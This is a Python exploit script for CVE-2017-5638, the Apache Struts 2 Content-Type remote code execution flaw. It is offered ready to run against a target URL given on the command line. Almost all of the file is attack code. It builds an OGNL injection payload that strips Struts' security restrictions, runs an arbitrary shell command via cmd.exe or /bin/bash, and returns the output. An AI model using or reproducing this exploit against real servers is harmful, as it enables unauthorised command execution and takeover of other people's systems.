#!/usr/bin/bash
# CVE:  CVE-2017-5638 | Apache Struts 2.3.5 < 2.3.31 RCE
# Author: FredBrave

import optparse, requests
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_address', help='url of target with path to .action file, for more -help')
    parser.add_option('-c', '--cmd', dest='cmd', help='Command to execute')
    (options, arguments) = parser.parse_args()
    if not options.url_address:
        parser.error('[-]Pls indicate url, Example: -u http://10.10.10.10:8080/example/example.action')
    if not options.cmd:
        parser.error('[-]Pls indicate the command to execute: -c "whoami"')
    return options

def creating_payload(cmd):
    payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
    payload += ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
    payload += ".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
    payload += ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    return payload

def execute(url, payload):
    headers = {
        'Content-Type': payload
    }
    try:
        r = requests.get(url=url, headers=headers, verify=False, stream=True)
        for chunk in r.iter_content(chunk_size=4096):
            try:
                line = chunk.decode('utf-8').strip()
                print(line)
            except (ValueError, UnicodeDecodeError) as e:
                print(f"Error al procesar chunk: {str(e)}")

    except requests.exceptions.RequestException as e:
        print(f"Error al realizar la solicitud: {str(e)}")

if __name__ == '__main__':
    options = get_arguments()
    payload = creating_payload(options.cmd)
    execute(options.url_address, payload)
    